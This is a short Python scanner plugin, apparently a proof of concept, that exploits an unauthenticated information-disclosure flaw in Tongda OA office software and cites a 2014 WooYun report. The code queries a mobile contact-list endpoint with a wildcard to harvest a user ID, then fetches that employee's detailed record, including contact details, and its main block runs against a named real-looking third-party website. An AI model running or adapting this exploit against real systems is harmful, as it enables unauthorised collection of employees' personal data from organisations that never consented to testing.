#!/usr/bin/env python
#*_* coding: utf-8 *_*

#name: tongdaoa(通达oa)员工信息遍历（无需登录）
#author: yichin
#refer: http://www.wooyun.org/bugs/wooyun-2014-082678

import re

def assign(service, arg):
    if service == "tongdaoa":
        return True, arg

def audit(arg):
    #获取员工userid以及部分信息
    url1 = arg + 'mobile/inc/get_contactlist.php?P=1&KWORD=%&isuser_info=3'
    code, head, res, errcode, _ = curl.curl2(url1)
    if code != 200:
        return False
    pattern = r'"user_uid":"([\d]*)"'
    m = re.search(pattern, res)
    if m == None:
        return False
    userid = m.group(1)
    #print userid
    #获取员工详细信息(包含联系方式)
    url2 = arg + 'mobile/user_info/data.php?P=1&ATYPE=getUserInfo&Q_ID=' + userid
    code, head, res, errcode, _ = curl.curl2(url2)
    if code == 200 and "user_name" in res and 'sex' in res:
        security_warning(arg + ': 通达oa员工信息遍历')
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('tongdaoa', 'http://www.zzkingmed.com/')[1])